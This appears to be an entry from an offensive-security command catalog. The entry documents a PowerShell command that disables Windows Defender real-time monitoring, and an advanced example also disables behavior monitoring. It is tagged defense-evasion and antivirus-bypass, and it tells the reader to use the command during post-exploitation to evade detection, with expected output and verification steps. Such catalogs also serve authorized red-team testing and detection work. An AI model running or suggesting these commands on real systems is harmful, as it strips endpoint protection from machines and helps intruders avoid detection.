---
id: 4a892d0c-821a-4ad9-b511-b3a1920c7dd3
name: powershell-set-mppreference-disable-realtime
type: command
executor: powershell
data: Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
output: |-
  VERBOSE: Setting MpPreference with the following parameters:
  DisableRealtimeMonitoring = True
created_at: '2023-01-10T04:46:44.806628+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - defense-evasion
  - antivirus-bypass
verified: true
validated: true
---

# powershell-set-mppreference-disable-realtime

## Command

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```

## Description

This PowerShell command disables Windows Defender's real-time monitoring feature, preventing it from scanning files and processes as they are accessed or executed. Use this during post-exploitation to evade antivirus detection, but it requires administrative privileges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -DisableRealtimeMonitoring | Sets real-time protection to disabled (use $true) | Yes |
| $true | Boolean value to enable the disable flag | Yes |
| -Verbose | Provides detailed output during execution | No |

## Examples

### Basic Usage

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```

### Advanced Usage

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -Verbose
```

## Expected Output

VERBOSE: Setting MpPreference with the following parameters:
DisableRealtimeMonitoring = True

If successful, no errors are returned, and verbose output confirms the change. Verify with Get-MpPreference to see the updated settings.

## Related

- [[procedures/Disable-Windows-Defender]]
